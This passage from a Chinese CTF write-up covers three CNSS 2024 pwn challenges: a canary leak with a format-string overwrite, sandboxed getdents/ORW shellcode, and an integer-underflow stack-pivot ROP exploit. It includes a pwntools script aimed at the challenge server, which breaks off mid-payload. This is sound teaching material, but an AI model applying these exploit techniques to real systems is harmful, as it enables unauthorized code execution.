喜食糖物，于是祂飞向了海边……

💡 Hint
💻 题目附件
点击下载

🚩 Flag格式
cnss{meaningful_sentence}

🔨 暴打出题人
@Astesia
</code></pre></div></div> <h6 id="hintcanary--n金丝雀-其次canary可能发音与candy有部分相近吧">   Hint+：Canary == n.金丝雀; 其次Canary可能发音与Candy有部分相近吧（</h6> <h5 id="所以这一题还是想办法绕过canary保护然后返回到后门函数实际上这一题比上一题上题上得早一些">   所以这一题还是想办法绕过Canary保护，然后返回到后门函数。实际上这一题比上一题上题上得早一些。<br/>   </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="nf">sugar_salt</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-38h]</span>
  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-34h]</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-30h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-8h]</span>

  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"We don't need a canaria. I'll kill you!"</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">40</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span> <span class="c1">// &lt;---------- 漏洞</span>
    <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Satou:%s"</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span> <span class="c1">// &lt;---------- leak canary and stack</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x28uLL</span><span class="p">);</span> 
  <span class="n">printf</span><span class="p">(</span><span class="s">"Shio:"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="n">s</span><span class="p">);</span> <span class="c1">// &lt;-------- 格式化字符串漏洞</span>
  <span class="k">return</span> <span class="n">v4</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="漏洞在for--i--v2-i--40-i-也是c语言新手常犯的错误下标是0开始的所以这里正好-offset-by-one--把canary最低位覆盖之后又自带一个输出就把canary泄露了可以看到第二遍输入没有越界写但是有格式化字符串漏洞所以这个格式化字符串漏洞做两件事一是修复canary最低位为x00二是改返回地址然后一件事由于我们要改栈上的内容于是需要指向栈某些位置的指针进而需要泄露栈地址幸好栈地址也和canary一起泄露了大致的payload如下使用hhn而不是n修改单个字节">   漏洞在<code class="language-plaintext highlighter-rouge">for ( i = v2; i &lt;= 40; ++i )</code>，也是c语言新手常犯的错误，下标是0开始的，所以这里正好 <strong><em>offset-by-one</em></strong> , 把Canary最低位覆盖，之后又自带一个输出就把Canary泄露了。<br/>   可以看到第二遍输入没有越界写，但是有格式化字符串漏洞。所以这个格式化字符串漏洞做两件事，一是修复Canary最低位为<code class="language-plaintext highlighter-rouge">'\x00'</code>，二是改返回地址。<br/>   然后一件事，由于我们要改栈上的内容，于是需要指向栈某些位置的指针，进而需要泄露栈地址，幸好栈地址也和Canary一起泄露了。<br/>   大致的payload如下，使用<code class="language-plaintext highlighter-rouge">%hhn</code>而不是<code class="language-plaintext highlighter-rouge">%n</code>修改单个字节。</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">canary</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span><span class="o">|</span><span class="mh">0xff</span> <span class="o">-</span> <span class="mh">0xff</span>
<span class="n">last_rbp</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span> <span class="c1"># 栈地址的一般高两位是空的
</span><span class="n">rbp</span> <span class="o">=</span> <span class="n">last_rbp</span> <span class="o">-</span> <span class="n">offset</span> <span class="c1"># offset 是定值
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">%{argv1_offset}$hhn</span><span class="sh">'</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">%{amount}c</span><span class="sh">'</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">%{argv2_offset}$hhn</span><span class="sh">'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="err">????</span> <span class="c1"># 确保接下来的两个指针参数按八位对齐。
</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rbp</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rbp</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>
</code></pre></div></div> <h6 id="然后这个backdoor也是有栈平衡的问题解决方式和上一题一致">   然后这个<code class="language-plaintext highlighter-rouge">backdoor()</code>也是有栈平衡的问题，解决方式和上一题一致。</h6> <h3 id="-s代表着mid">🤔 s代表着…(🤖Mid)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
塞克考姆城的神奇旗帜
其真名会随时间而变化

据说只有呼唤出正确的名号
才能被举起挥舞

如坚实的巨树，屹立不倒
如敏捷的幻象，若即若离
如神圣的光芒，指引胜利

筛尔寇德？挥舞旗帜的第一勇士。

💡 Hint
flag文件名并非"./flag"、"./flag.txt"等
注意沙箱中被允许的系统调用
💻 题目附件
点击下载

🚩 Flag格式
cnss{meaningful_sentence}

🔨 暴打出题人
@Astesia
</code></pre></div></div> <h6 id="已经告诉了s代表shellcode">   已经告诉了s代表shellcode。</h6> <h5 id="checksec魅力时刻有rwx段但就是不提示只能gdb调试看看">   checksec魅力时刻，有rwx段，但就是不提示，只能gdb调试看看。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>checksec pwn5
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/pwn/worktable/cnss2024/pwn5'</span>
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled   &lt;<span class="nt">-----</span> 注意开了PIE
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
       0x142857000        0x142858000 rwxp     1000      0 <span class="o">[</span>anon_142857]
    0x555555554000     0x555555555000 r--p     1000      0 /home/pwn/worktable/cnss2024/pwn5
    0x555555555000     0x555555556000 r-xp     1000   1000 /home/pwn/worktable/cnss2024/pwn5
    0x555555556000     0x555555557000 r--p     1000   2000 /home/pwn/worktable/cnss2024/pwn5
    0x555555557000     0x555555558000 r--p     1000   2000 /home/pwn/worktable/cnss2024/pwn5
    0x555555558000     0x555555559000 rw-p     1000   3000 /home/pwn/worktable/cnss2024/pwn5
    0x7ffff7d60000     0x7ffff7d63000 rw-p     3000      0 <span class="o">[</span>anon_7ffff7d60]
</code></pre></div></div> <h6 id="第一个就是">   第一个就是。<br/></h6> <h5 id="注意到开了sandbox">   注意到开了sandbox</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> line  CODE  JT   JF      K
<span class="o">=================================</span>
 0000: 0x20 0x00 0x00 0x00000004  A <span class="o">=</span> <span class="nb">arch
 </span>0001: 0x15 0x00 0x0b 0xc000003e  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> ARCH_X86_64<span class="o">)</span> goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A <span class="o">=</span> sys_number
 0003: 0x35 0x00 0x01 0x40000000  <span class="k">if</span> <span class="o">(</span>A &lt; 0x40000000<span class="o">)</span> goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> 0xffffffff<span class="o">)</span> goto 0013
 0005: 0x15 0x06 0x00 0x00000000  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> <span class="nb">read</span><span class="o">)</span> goto 0012
 0006: 0x15 0x05 0x00 0x00000001  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> write<span class="o">)</span> goto 0012
 0007: 0x15 0x04 0x00 0x00000002  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> open<span class="o">)</span> goto 0012
 0008: 0x15 0x03 0x00 0x00000003  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> close<span class="o">)</span> goto 0012
 0009: 0x15 0x02 0x00 0x00000009  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> mmap<span class="o">)</span> goto 0012
 0010: 0x15 0x01 0x00 0x0000004e  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> getdents<span class="o">)</span> goto 0012
 0011: 0x15 0x00 0x01 0x0000005a  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> <span class="nb">chmod</span><span class="o">)</span> goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  <span class="k">return </span>ALLOW
 0013: 0x06 0x00 0x00 0x00000000  <span class="k">return </span>KILL
</code></pre></div></div> <h5 id="由于hint提示flag名称未知所以我们需要使用图中getdents先获取当前列表的所有文件信息然后再打一个orw注意k那一列是具体的系统调用号网上都教64位用getdents64但它的调用号这题被ban了用getdents本身也足够了问了出题人flag的名称每1s变一次所以才给了两次shellcode的机会然后注意一点第一遍shellcode要有压栈和返回的操作不然到这就segv了没有第二次shellcode的机会开辟0x200栈空间信息直接放在栈上">   由于Hint提示flag名称未知，所以我们需要使用图中<code class="language-plaintext highlighter-rouge">getdents</code>先获取当前列表的所有文件信息，然后再打一个ORW。<br/>   注意<code class="language-plaintext highlighter-rouge">K</code>那一列，是具体的系统调用号，网上都教64位用<code class="language-plaintext highlighter-rouge">getdents64</code>，但它的调用号这题被ban了，用<code class="language-plaintext highlighter-rouge">getdents</code>本身也足够了。<br/>   问了出题人，flag的名称每1s变一次，所以才给了两次shellcode的机会。<br/>   然后注意一点，第一遍shellcode要有压栈和返回的操作，不然到这就SEGV了，没有第二次shellcode的机会。<br/>   开辟0x200栈空间，信息直接放在栈上。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shellcode1 <span class="o">=</span> <span class="s1">'''
    push rbp
    mov rbp, rsp
    sub rsp, 0x200
'''</span>
shellcode1 +<span class="o">=</span> shellcraft.open<span class="o">(</span><span class="s2">"./"</span><span class="o">)</span>
shellcode1 +<span class="o">=</span> shellcraft.getdents<span class="o">(</span>3, <span class="s2">"rsp"</span>, 0x200<span class="o">)</span>
shellcode1 +<span class="o">=</span> shellcraft.write<span class="o">(</span>1, <span class="s2">"rsp"</span>, 0x200<span class="o">)</span>
shellcode1 +<span class="o">=</span> <span class="s1">'''
        leave
        ret
'''</span>

shellcode2 <span class="o">=</span> <span class="o">{</span><span class="nv">$orw</span><span class="o">}</span>
</code></pre></div></div> <h5 id="博主写的时候由于用的wsl不知为何wsl上pwntools的asm很慢导致两次shellcode间隔超过1sflag文件名已经变了死活过不了后来用虚拟机直接过">   博主写的时候由于用的wsl，不知为何wsl上pwntools的asm()很慢，导致两次shellcode间隔超过1s，flag文件名已经变了，死活过不了，后来用虚拟机直接过😅。</h5> <h3 id="-头号玩家mid">😎 头号玩家(🤖Mid)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
隐匿在品学楼之中的幽灵，
不可观测，难以言喻

旧时，会有许多人前去寻找他，
或恐惧、或期待

话虽如此，
真正的他，或许早已被人忘却

💡 Hint
💻 题目附件
点击下载

🚩 Flag格式
cnss{meaningful_sentence}

🔨 暴打出题人
@Orchid
</code></pre></div></div> <h5 id="谜语人题目前置知识是看过头号玩家至少是电影中的第一关实现逻辑比较长这里就不贴了简单来说就是根据程序的随机输出做一个类似yes-or-no的游戏初始有30分50次机会答对一次加一分错一次减一分玩完之后有一个读入字符串的机会有多少分就可以读多少字符本题依然checksec魅力时刻">   谜语人题目，前置知识是看过头号玩家（至少是电影中的第一关）<br/>   实现逻辑比较长，这里就不贴了，简单来说就是根据程序的随机输出，做一个类似Yes or No的游戏，初始有30分，50次机会，答对一次加一分，错一次减一分。玩完之后，有一个读入字符串的机会，有多少分就可以读多少字符。<br/>   本题依然checksec魅力时刻</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@PainTech:/home/pwn/worktable/cnss2024# checksec pwn6
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/pwn/worktable/cnss2024/pwn6'</span>
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE <span class="o">(</span>0x400000<span class="o">)</span>
    Stripped:   No
</code></pre></div></div> <h5 id="显示canary-found实际上根本没有一般题目可以在ida中去找找__stack_chk_fail函数如果有就是有canary但本题静态链接东西多不好找所以动调看rbp---0x8有没有canary发现没有">   显示<code class="language-plaintext highlighter-rouge">Canary found</code>，实际上根本没有。一般题目可以在IDA中去找找<code class="language-plaintext highlighter-rouge">__stack_chk_fail</code>函数，如果有就是有Canary；但本题静态链接，东西多不好找，所以动调看<code class="language-plaintext highlighter-rouge">rbp - 0x8</code>有没有Canary，发现没有。<br/></h5> <h5 id="本题的打法有两种先说正解也就是和头号玩家有关系的解法">   本题的打法有两种，先说正解，也就是和头号玩家有关系的解法。</h5> <p><img src="https://www.helloimg.com/i/2024/09/27/66f617fc16ef9.png" alt="Screenshot 2024-09-27 103245.png"/></p> <h5 id="关键点在于正着开不行要你倒着开由于没canary所以要打一个栈溢出但问题是如果全部答对也只有80字节这个大小只够恰好覆盖到返回地址根本不够ropchain">   关键点在于正着开不行要你倒着开。由于没Canary，所以要打一个栈溢出，但问题是如果全部答对，也只有80字节，这个大小只够恰好覆盖到返回地址，根本不够ROPchain</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// edx</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// ecx</span>
  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// r8d</span>
  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// r9d</span>
  <span class="kt">char</span> <span class="n">v8</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-50h] BYREF</span>
  <span class="kt">char</span> <span class="n">v9</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-40h] BYREF // &lt;-----目标字符串</span>
  <span class="kt">int</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-18h]</span>
  <span class="kt">int</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [rsp+3Ch] [rbp-14h]</span>
  <span class="kt">int</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp-10h]</span>
  <span class="kt">int</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// [rsp+44h] [rbp-Ch]</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp-8h]</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// [rsp+4Ch] [rbp-4h] // &lt;------得分和</span>
                                          <span class="c1">// 也就是最后输入的字符串的长度</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="细心的童鞋肯定发现只有v15是无符号数其他都是有符号数恰巧又有对v15做减法的操作答错题目所以如果故意答错题目既倒着开v15就会向下溢出为一个很大正整数此时构造ropchain打一个-ret2syscall-完全足够了">   细心的童鞋肯定发现，只有v15是无符号数，其他都是有符号数，恰巧又有对v15做减法的操作（答错题目），所以如果故意答错题目（既倒着开），v15就会向下溢出为一个很大正整数，此时构造ROPchain，打一个 <strong><em>ret2syscall</em></strong> 完全足够了。<br/></h5> <h5 id="然后说另一种解法也就是哥们独创的解法还把aic给带偏了如果不考虑整型向下溢出的话那么正好溢出到返回地址于是可以按照栈迁移的思路来打">   然后说另一种解法，也就是哥们独创的解法，还把aic给带偏了🤣。<br/>   如果不考虑整型向下溢出的话，那么正好溢出到返回地址,于是可以按照栈迁移的思路来打。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:0000000000401B76 loc_401B76:                             <span class="p">;</span> CODE XREF: main+227↑j
.text:0000000000401B76                 mov     edx, 19h
.text:0000000000401B7B                 lea     rax, aNowShowMeYourP <span class="p">;</span> <span class="s2">"Now, show me your power!</span><span class="se">\n</span><span class="s2">"</span>
.text:0000000000401B82                 mov     rsi, rax
.text:0000000000401B85                 mov     edi, 1
.text:0000000000401B8A                 call    write
.text:0000000000401B8F                 mov     edx, 14h
.text:0000000000401B94                 lea     rax, aSayTheMagicWor <span class="p">;</span> <span class="s2">"Say the magic word!</span><span class="se">\n</span><span class="s2">"</span>
.text:0000000000401B9B                 mov     rsi, rax
.text:0000000000401B9E                 mov     edi, 1
.text:0000000000401BA3                 call    write
.text:0000000000401BA8                 mov     edx, <span class="o">[</span>rbp+var_4]
.text:0000000000401BAB                 lea     rax, <span class="o">[</span>rbp+var_40]
.text:0000000000401BAF                 mov     esi, edx
.text:0000000000401BB1                 mov     rdi, rax
.text:0000000000401BB4                 call    myRead
.text:0000000000401BB9                 mov     eax, 0
.text:0000000000401BBE                 leave
.text:0000000000401BBF                 retn
.text:0000000000401BBF <span class="p">;</span> <span class="o">}</span> // starts at 40192E
.text:0000000000401BBF main            endp
</code></pre></div></div> <h5 id="此处为-main-最后的输入字符串的部分注意到0x401ba8开始为myread可视为一般的read准备参数其中var_4var_40都是固定值-4和-40所以可以将rbp迁移到某个-4位置为一个较大数的位置这样可以实现读大量字符串于是去找一块符合条件的风水宝地">   此处为 <code class="language-plaintext highlighter-rouge">main()</code> 最后的输入字符串的部分，注意到<code class="language-plaintext highlighter-rouge">0x401BA8</code>开始为<code class="language-plaintext highlighter-rouge">myread()</code>（可视为一般的<code class="language-plaintext highlighter-rouge">read()</code>）准备参数，其中<code class="language-plaintext highlighter-rouge">var_4</code>，<code class="language-plaintext highlighter-rouge">var_40</code>都是固定值（-4和-40），所以可以将<code class="language-plaintext highlighter-rouge">rbp</code>迁移到某个<code class="language-plaintext highlighter-rouge">-4</code>位置为一个较大数的位置，这样可以实现读大量字符串。<br/>   于是去找一块符合条件的风水宝地</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.data:00000000004A0277                 db    0
.data:00000000004A0278                 db 0FFh
.data:00000000004A0279                 db 0FFh
.data:00000000004A027A                 db 0FFh
.data:00000000004A027B                 db 0FFh
.data:00000000004A027C                 db 0FFh
.data:00000000004A027D                 db 0FFh
.data:00000000004A027E                 db 0FFh
.data:00000000004A027F                 db 0FFh
</code></pre></div></div> <h5 id="随便找一个即可">   随便找一个即可<br/></h5> <h5 id="然后是返回地址理论上可以选0x4019ce及以下的任意位置但是上如果直接跳转到上面myread的位置会segv猜测是栈没布置好访问到非法内存了而跳转到0x4019ce就没有问题当然这意味着要再来50组游戏虽然这次可以随便玩">   然后是返回地址，理论上可以选<code class="language-plaintext highlighter-rouge">0x4019CE</code>及以下的任意位置，但是上如果直接跳转到上面<code class="language-plaintext highlighter-rouge">myread()</code>的位置会SEGV，猜测是栈没布置好，访问到非法内存了，而跳转到<code class="language-plaintext highlighter-rouge">0x4019CE</code>就没有问题，当然这意味着要再来50组游戏，虽然这次可以随便玩。<br/></h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:00000000004019C7                 mov     <span class="o">[</span>rbp+var_4], 30
.text:00000000004019CE                 mov     <span class="o">[</span>rbp+var_10], 50
.text:00000000004019D5                 lea     rax, asc_474107 <span class="p">;</span> <span class="s2">"-------------------------"</span>
.text:00000000004019DC                 mov     rdi, rax
.text:00000000004019DF                 call    puts
.text:00000000004019E4                 mov     <span class="o">[</span>rbp+var_8], 0
.text:00000000004019EB                 jmp     loc_401B6A
</code></pre></div></div> <h5 id="由我们控制的myread结束后程序将leave-ret这也是这种恰好只溢出返回地址的题目在栈迁移时关键的一点既不将返回地址覆盖为leave-ret而是想办法要再次利用-read-往fake_rbp-上写一些东西然后用函数末尾自带的leave-ret完成向目标位置的栈迁移对于这题而言leave-ret的流程是将rsp骗到我们输入地址0x40的位置pop-rbp该位置然后ret上一个字长位置这意味着需要在输入时设置0x40--0x8的没啥用数据然后才是ropchain">   由我们控制的<code class="language-plaintext highlighter-rouge">myread()</code>结束后，程序将<code class="language-plaintext highlighter-rouge">leave ret</code>，这也是这种恰好只溢出返回地址的题目在栈迁移时关键的一点，既不将返回地址覆盖为<code class="language-plaintext highlighter-rouge">leave ret</code>，而是想办法要再次利用 <code class="language-plaintext highlighter-rouge">read()</code> ，往<code class="language-plaintext highlighter-rouge">fake_rbp</code> 上写一些东西，然后用函数末尾自带的<code class="language-plaintext highlighter-rouge">leave ret</code>，完成向目标位置的栈迁移。<br/>   对于这题而言，<code class="language-plaintext highlighter-rouge">leave ret</code>的流程是将<code class="language-plaintext highlighter-rouge">rsp</code>骗到我们输入地址<code class="language-plaintext highlighter-rouge">+0x40</code>的位置，<code class="language-plaintext highlighter-rouge">pop rbp</code>该位置，然后<code class="language-plaintext highlighter-rouge">ret</code>上一个字长位置。这意味着需要在输入时设置<code class="language-plaintext highlighter-rouge">0x40 + 0x8</code>的没啥用数据，然后才是ROPchain。<br/></h5> <h5 id="由于不是标解所以把这种exp放上来仅供参考">   由于不是标解，所以把这种exp放上来，仅供参考</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">"</span><span class="s">debug</span><span class="sh">"</span>
<span class="c1"># io = process("./pwn6")
</span><span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./pwn6</span><span class="sh">"</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">152.136.11.155</span><span class="sh">"</span><span class="p">,</span> <span class="mi">31514</span><span class="p">)</span>
<span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x401291</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x474010</span>
<span class="n">rax_ret</span> <span class="o">=</span> <span class="mh">0x41dd07</span>
<span class="n">rdi_ret</span> <span class="o">=</span> <span class="mh">0x402368</span>
<span class="n">rsi_ret</span> <span class="o">=</span> <span class="mh">0x409560</span>
<span class="n">rdx_rcx_ret</span> <span class="o">=</span> <span class="mh">0x401855</span>
<span class="n">main</span> <span class="o">=</span> <span class="mh">0x4019ce</span>
<span class="n">myread</span> <span class="o">=</span> <span class="mh">0x401B7b</span>
<span class="n">data_2</span> <span class="o">=</span> <span class="mh">0x4A0698</span> <span class="o">+</span> <span class="mi">4</span> <span class="c1"># 0x4a069c
</span><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x401016</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">-------------------------</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">target</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">?</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">target</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Clomp</span><span class="sh">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
        <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">O</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">word!</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 80 0x50
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">data_2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="c1"># change rbp
</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="nf">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">-------------------------</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">target</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">?</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">target</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Clomp</span><span class="sh">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
        <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">O</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">oxdeadbeef</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span>
